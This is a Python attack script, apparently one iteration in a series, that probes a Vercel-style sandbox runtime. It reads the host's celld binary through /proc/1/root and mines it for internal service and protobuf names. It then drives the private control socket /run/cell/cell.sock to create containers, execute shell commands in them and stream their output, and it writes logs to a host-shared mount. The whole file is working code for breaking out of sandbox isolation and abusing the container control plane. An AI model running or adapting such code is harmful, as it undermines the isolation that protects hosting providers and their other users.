# -*- coding: utf-8 -*-
"""v89 payload: attach 机制挖掘 → Create(attach) → Start → Exec → StreamOutput 拉输出
v88 确认: StreamOutputRequest = {container_id:1, stream:2(enum OutputStream)}
报错 "container output must be attached before start" → 需 Create 时 attach
v82 发现 CreateRequest.GetAttachStdin → CreateRequest 有 attach 字段
v89: (a) CreateRequest/StartRequest/ExecRequest 全字段 (b) 服务方法列表 (c) attach 变体矩阵"""
import socket, time, os, json, re, struct

OUT = '/vercel/sandbox/v89c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v89c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pvar(field_no, n):
    return pvarint((field_no << 3) | 0) + pvarint(n)


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def grpc_req(pl):
    return b'\x00' + struct.pack('>I', len(pl)) + pl


def main():
    log('V89 payload start pid=%d' % os.getpid())
    R = '/proc/1/root'
    data = open(R + '/opt/vercel/celld', 'rb').read()

    # A. CreateRequest / StartRequest / ExecRequest / KillRequest 全部 Getter
    for mname in ('CreateRequest', 'StartRequest', 'ExecRequest', 'KillRequest', 'WaitRequest', 'ExecResponse'):
        pat = re.compile(rb'containers\.\(\*' + re.escape(mname.encode()) + rb'\)\.Get([A-Za-z0-9_]+)')
        got = sorted(set(m.group(1).decode() for m in pat.finditer(data)))
        log('GET %s: %s' % (mname, got))

    # B. 服务方法列表
    for svc in ('containersconnect.ContainersServiceHandler',
                'processesconnect.ProcessesServiceHandler',
                'hiveconnect.CellServiceHandler'):
        pat = re.compile(re.escape(svc.encode()) + rb'\.([A-Za-z0-9_]+)-fm')
        got = sorted(set(m.group(1).decode() for m in pat.finditer(data)))
        log('SVC %s: %s' % (svc.split('.')[-1], got))

    # C. attach 相关 tag (json 名)
    pat = re.compile(rb'protobuf:"[^"]*name=attach[^"]*"')
    out = []
    for m in pat.findall(data):
        s = m.decode(errors='replace')
        if s not in out:
            out.append(s[:150])
        if len(out) >= 8:
            break
    log('ATTACH-TAG: %s' % out)

    # D. Create attach 变体矩阵
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PROCS = '/vercel.hive.cell.api.processes.v1.ProcessesService'
    bodies = [
        '{"drive_id":"sandbox","attach_stdout":true}',
        '{"drive_id":"sandbox","attach_stdout":true,"attach_stderr":true}',
        '{"drive_id":"sandbox","attach":true}',
        '{"drive_id":"sandbox","attach_stdin":true,"attach_stdout":true,"attach_stderr":true}',
    ]
    for bi, body in enumerate(bodies):
        st, bd = rpc(CTR + '/Create', body, t=8)
        cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
        log('C%d CREATE %s -> %s cid=%s' % (bi, body, st, cid or bd[:120]))
        if not cid:
            continue
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(0.8)
        argv = ['/bin/sh', '-c', 'echo V89_OUT_%d_ABC123; echo V89_ERR_%d_XYZ789 >&2; sleep 22' % (bi, bi)]
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('C%d execA PA=%s' % (bi, PA or bd[:80]))
        time.sleep(1)
        # StreamOutput (容器级): {f1:cid, f2:stream}
        for sv in (1, 2):
            pl = pstr(1, cid) + pvar(2, sv)
            st, hd, bd = rpc_raw(CTR + '/StreamOutput', grpc_req(pl), 'application/grpc', t=4)
            log('C%d SO cid+stream#%d -> %s %r' % (bi, sv, st, bd[:180]))
        # StreamOutput (进程级, processes 服务): {f1:PA, f2:stream}
        if PA:
            for sv in (1, 2):
                pl = pstr(1, PA) + pvar(2, sv)
                st, hd, bd = rpc_raw(PROCS + '/StreamOutput', grpc_req(pl), 'application/grpc', t=4)
                log('C%d PSO pa+stream#%d -> %s %r' % (bi, sv, st, bd[:180]))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('C%d killed' % bi)
        time.sleep(0.5)

    log('V89C_DONE')


main()
